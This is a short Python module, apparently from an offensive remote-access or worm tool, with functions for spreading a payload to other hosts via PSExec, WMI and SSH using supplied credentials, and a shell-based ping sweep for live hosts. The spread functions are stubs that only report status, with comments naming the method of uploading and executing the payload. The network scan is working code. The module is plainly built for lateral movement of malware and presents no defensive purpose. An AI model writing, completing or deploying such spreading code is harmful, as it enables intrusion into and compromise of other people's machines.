import subprocess


def psexec_spread(protocol, target_ip, username, password, payload_path):
    """Spread via PSExec (Windows)."""
    protocol.send(f'[*] Attempting PSExec spread to {target_ip}')
    # Implementation: Upload payload, execute via PSExec
    return f'[*] PSExec spread initiated to {target_ip}'


def wmi_spread(protocol, target_ip, username, password, payload_path):
    """Spread via WMI (Windows)."""
    protocol.send(f'[*] Attempting WMI spread to {target_ip}')
    # Implementation: wmic node call create
    return f'[*] WMI spread initiated to {target_ip}'


def ssh_spread(protocol, target_ip, username, password, payload_path):
    """Spread via SSH with key/password auth (Linux)."""
    protocol.send(f'[*] Attempting SSH spread to {target_ip}')
    # Implementation: scp payload, ssh execute
    return f'[*] SSH spread initiated to {target_ip}'


def scan_network(protocol, subnet='192.168.1.0/24'):
    """Quick network scan for alive hosts."""
    protocol.send(f'[*] Scanning {subnet}')
    try:
        output = subprocess.check_output(
            f'for i in $(seq 1 254); do ping -c 1 -W 1 {subnet.split(".")[0]}.{subnet.split(".")[1]}.{subnet.split(".")[2]}.$i & done',
            shell=True, timeout=30
        ).decode(errors='replace')
        return output.strip() or '[-] No hosts found'
    except Exception:
        return '[-] Network scan failed'
